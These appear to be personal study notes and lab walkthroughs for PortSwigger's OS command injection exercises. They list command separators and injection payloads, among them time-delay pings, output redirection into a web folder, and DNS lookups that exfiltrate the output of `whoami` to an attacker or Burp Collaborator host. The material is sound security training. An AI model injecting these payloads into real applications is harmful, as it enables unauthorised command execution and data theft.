# OS Command Injection Notes

[Portswigger](https://portswigger.net/web-security/os-command-injection)

## Methodology

### Useful commands

|Purpose of command| 	Linux| 	Windows|
|:----|:---|:----|
|Name of current user 	|whoami 	|whoami|
|Operating system 	|uname -a 	|ver|
|Network configuration 	|ifconfig |	ipconfig /all|
|Network connections 	|netstat -an | netstat -an|
|Running processes 	|ps -ef 	|tasklist |

### Detecting blind OS command injections

**Command to detect using time delays**

```
& ping -c 10 127.0.0.1 &
```

**Command to detect by redirecting output**

```
& whoami > /var/www/static/whoami.txt &
```

Afterwards go to the /whoami/txt to determine if you did write it to the server

**Command to detect with out of band interaction**

```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

### Ways of injecting OS commands

- &
- &&
- |
- ||

Separators that work only on Unix based systems
- ;
- Newline (0x0a or \n)

Unix inline execution syntax
- \`\`
- $()


## Labs Walkthrough

### OS command injection, simple case

- use the check stock level, intercept and change the storeID parameter with `1|whoami`

### Blind OS command injection with time delays

- use burp suite to intercept and modify the request that submits the feedback
- modify the email parameter with `email=x||ping+-c+10+127.0.0.1||`
- request now takes about 10 seconds to return showing the injection worked

### Blind OS command injection with output redirection

Background

```
You can use output redirection to capture the output from the command. There is a writable folder at:
/var/www/images/
```

- submit feedback again, but change the email parameter with `email=||whoami>/var/www/images/output.txt||`
- now intercept and modify the request that loads an image of a product
- modify the filename parameter with `filename=output.txt`
- observe that we get the file with our injected commands input in the file

### Blind OS command injection with out-of-band interaction

Background:
```
To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 
```

- submit feedback but change the email parameter again with `email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
- poll collaborator and you should see the connection back from the application

### Blind OS command injection with out-of-band data exfiltration

- similar to above but we are trying to get the value of `whoami` out
- so send feedback again but this time append the whoami command as a concatenation of the burp collaborator as a subdomain so we can pull it off like so:

```email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||```



